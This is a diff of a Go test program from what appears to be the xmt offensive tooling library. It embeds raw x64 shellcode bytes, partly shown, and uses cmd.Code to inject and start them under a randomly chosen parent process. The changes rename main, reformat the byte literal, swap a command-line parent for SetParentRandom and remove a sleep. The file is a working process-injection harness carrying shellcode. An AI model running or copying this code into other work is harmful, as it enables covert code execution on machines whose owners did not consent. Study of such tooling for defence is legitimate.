@@ -2,15 +2,15 @@ package main
 
 import (
 	"fmt"
-	"os"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
 )
 
-func main() {
+func test6Main() {
 	c := &cmd.Code{
-		Data: []byte("\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52" +
+		Data: []byte("" +
+			"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52" +
 			"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48" +
 			"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9" +
 			"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41" +
@@ -45,7 +45,7 @@ func main() {
 	}
 
 	c.Timeout = 3 * time.Second
-	c.SetParent(os.Args[1])
+	c.SetParentRandom(nil)
 
 	if err := c.Start(); err != nil {
 		panic(err)
@@ -54,5 +54,4 @@ func main() {
 	fmt.Println(c.Wait())
 	fmt.Println(c.ExitCode())
 
-	time.Sleep(30 * time.Second)
 }
